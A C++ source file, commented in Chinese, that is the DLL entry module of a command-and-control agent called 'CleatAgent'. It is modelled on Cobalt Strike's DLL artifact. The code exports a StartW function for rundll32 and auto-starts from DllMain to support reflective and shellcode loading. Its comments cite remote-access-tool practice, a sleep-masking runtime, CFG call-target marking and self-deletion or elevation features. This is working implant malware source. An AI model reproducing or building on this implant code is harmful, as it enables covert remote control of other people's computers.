/**
 * @file EntryDll.cpp
 * @brief DLL 形态入口（对齐 CS dll artifact 形态）
 * @details
 * 启动方式: rundll32.exe CleatAgent.dll,StartW
 * （StartW 导出；参数随宿主命令行注入，与 EXE 形态同一套 --xxx 解析）
 *
 * DllMain 保持最轻（仅 DisableThreadLibraryCalls）：不建线程/不联网，
 * 启动由 StartW 显式触发 —— 避免加载器锁风险与“加载即跑”不可控。
 *
 * 守卫语义（与 EXE 不同，见 4 处 _WINDLL 守卫）：自删除/提权重启/崩溃自重启
 * 在 DLL 形态下禁用（宿主进程语义，由 RunAgent 内 _WINDLL 判断）。
 */

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>  // CommandLineToArgvW

#pragma comment(lib, "shell32.lib")
#include <cstdio>
#include <cstdlib>   // __argc/__argv (MSVC)
#include <atomic>
#include <string>
#include <vector>
#include "AgentEntry.hpp"
#include "Core/Mask/MaskPark.hpp"

// DllAutoStart 会等它决定是否兜底启动, 实现缺失)。双重 RunAgent(StartW 显式
// 触发 + DllAutoStart 兜底)由 AgentEntry 的进程级 s_started 闸门兜住, 先到者赢。
// 删除死变量, 语义以 DllMain 注释为准。

namespace {
    //  rundll32 场景 DllAutoStart(延迟 500ms)与 StartW
    // 竞速, 前者若先抢到 s_started 闸门会以**零参**启动 —— 宿主命令行参数
    // (--host 等)被静默丢弃, 产物连到编译期默认地址。StartW 先立"显式启动"
    // 意图, DllAutoStart 见意图即让行(仅当宽限期内 StartW 始终未进 RunAgent
    // 才兜底零参启动, 覆盖显式入口异常未达的残局)。
    std::atomic<bool> g_explicit_start{ false };
    std::atomic<bool> g_started_here{ false };

#ifndef NDEBUG
    // 证据 —— Debug 构建专用的落盘标记(Release 零编译)。
    void DllPathMark(const char* s) {
        if (FILE* f = std::fopen("cleat_dllpath.log", "a")) {
            std::fputs(s, f);
            std::fclose(f);
        }
    }
#else
    inline void DllPathMark(const char*) {}
#endif
}

 /**
  * @brief rundll32 要求的导出入口函数
  * @param hwnd     窗口句柄（rundll32 传入，本实现未使用）
  * @param hinst    实例句柄（rundll32 传入，本实现未使用）
  * @param lpszCmdLine 命令行参数字符串（rundll32 传入，本实现未使用）
  * @param nCmdShow 窗口显示方式（rundll32 传入，本实现未使用）
  *
  * __argc/__argv 由 /MT 静态 CRT 的 DLL 初始化时已从宿主命令行解析，可直接使用。
  */
extern "C" __declspec(dllexport) void WINAPI StartW(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    g_explicit_start.store(true, std::memory_order_release);
    g_started_here.store(true, std::memory_order_release);
    DllPathMark("[cleat] StartW: RunAgent 进入\n");
    // **必须用 GetCommandLineW 自行解析**: __argc/__argv 只在
    // /MT(静态 CRT 自含)下可靠 —— /MD 的共享 ucrtbase 里这份全局由 EXE 的 CRT
    int wargc = 0;
    LPWSTR* wargv = ::CommandLineToArgvW(::GetCommandLineW(), &wargc);
    std::vector<std::string> args;
    std::vector<const char*> argv;
    if (wargv) {
        args.reserve(static_cast<size_t>(wargc));   // 先扩满: c_str() 已存入 argv, 重分配会使指针悬空
        argv.reserve(static_cast<size_t>(wargc));
        for (int i = 0; i < wargc; ++i) {
            const int len = ::WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, nullptr, 0, nullptr, nullptr);
            args.emplace_back();
            if (len > 0) {
                args.back().resize(static_cast<size_t>(len) - 1);
                ::WideCharToMultiByte(CP_UTF8, 0, wargv[i], -1, args.back().data(), len, nullptr, nullptr);
            }
            argv.push_back(args.back().c_str());
        }
        ::LocalFree(wargv);
    }
    const int argc = static_cast<int>(argv.size());
    cleat::RunAgent(argc, argv.empty() ? nullptr : const_cast<char**>(argv.data()));
    DllPathMark("[cleat] StartW: RunAgent 返回\n");
}

/**
 * @brief 自动启动工作线程（由 DllMain 在 ATTACH 时创建）
 * @param lpParam 未使用
 * @return 始终返回 0
 *
 * 延迟 500ms 避开加载器锁窗口（老式远控标准做法，防止 DllMain 期间 LoadLibrary 死锁）。
 */
DWORD WINAPI DllAutoStart(LPVOID lpParam) {
    ::Sleep(500);
    if (g_explicit_start.load(std::memory_order_acquire)) {
        // 显式入口已就位: 让行(宽限 10s; 参数在宿主命令行里, 零参启动=丢参)
        for (int i = 0; i < 100 && !g_started_here.load(std::memory_order_acquire); ++i) {
            ::Sleep(100);
        }
        if (g_started_here.load(std::memory_order_acquire)) {
            DllPathMark("[cleat] DllAutoStart: StartW 已接管, 转停靠长驻\n");
            // **让行后不退出**: 本线程诞生于 DllMain, 其退出
            // 路径(线程 DETACH/加载器锁链)在真机观测到永久挂死 —— 挂死的镜像内
            // 线程被掩码普查判为名单外, DLL 形态掩码从此全拒。转为**停靠参与者
            // 长驻**: 注册进普查名单(allow) + 循环检查点(窗口期停靠, 空闲期打盹),
            // 生命周期交给宿主进程退出回收。
            cleat::MaskPark::Registration yield_reg;
            (void)yield_reg;
            for (;;) {
                cleat::MaskPark::ParticipantCheckpoint();
                ::Sleep(100);
            }
        }
    }
    DllPathMark("[cleat] DllAutoStart: 兜底零参启动\n");
    // 零参数启动：配置来自编译期烧参（CLEAT_DEFAULT_*）或内置默认；无命令行依赖
    cleat::RunAgent(0, nullptr);
    DllPathMark("[cleat] DllAutoStart: RunAgent 返回, 转停靠长驻\n");
    // 同上: RunAgent 返回(停止/ExitProgram)后宿主随即退出, 本线程不自行退出
    // —— 规避退出挂死; 宿主若继续存活(异常残局), 停靠循环保持普查名单一致。
    cleat::MaskPark::Registration done_reg;
    (void)done_reg;
    for (;;) {
        cleat::MaskPark::ParticipantCheckpoint();
        ::Sleep(100);
    }
}

/**
 * @brief DLL 入口点
 * @param hModule   模块句柄
 * @param ul_reason_for_call 调用原因
 * @param lpReserved 保留参数
 * @return 始终返回 TRUE
 *
 * 在 PROCESS_ATTACH 时仅调用 DisableThreadLibraryCalls 并创建自动启动线程。
 * 这适用于反射加载（无 StartW 调用方）或 rundll32 加载即上线的场景。
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        // 注: DLL 形态窗口崩溃的**主因是 CFG icall 校验**(宿主 EXE 带 GUARD_CF 时
        // 进程 CFG 开启, ntdll 派发器拒绝无 CFG 位的回调指针) —— 已由 MaskRuntime
        // 的 SetProcessValidCallTargets 标记修复。
        const bool suppressed = ::DisableThreadLibraryCalls(hModule) != FALSE;
        if (!suppressed || cleat::MaskPark::DetectTlsCallbacks()) {
            cleat::MaskPark::MarkThreadNotifyUnsafe();
        }
        // 自动启动（反射加载无 StartW 调用方；rundll32 加载即上线）。
        // 注意：正常 LoadLibrary 场景同样自动启动 —— 这是 shellcode 形态的前提。
        ::CreateThread(nullptr, 0, DllAutoStart, nullptr, 0, nullptr);
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
#endif // _WIN32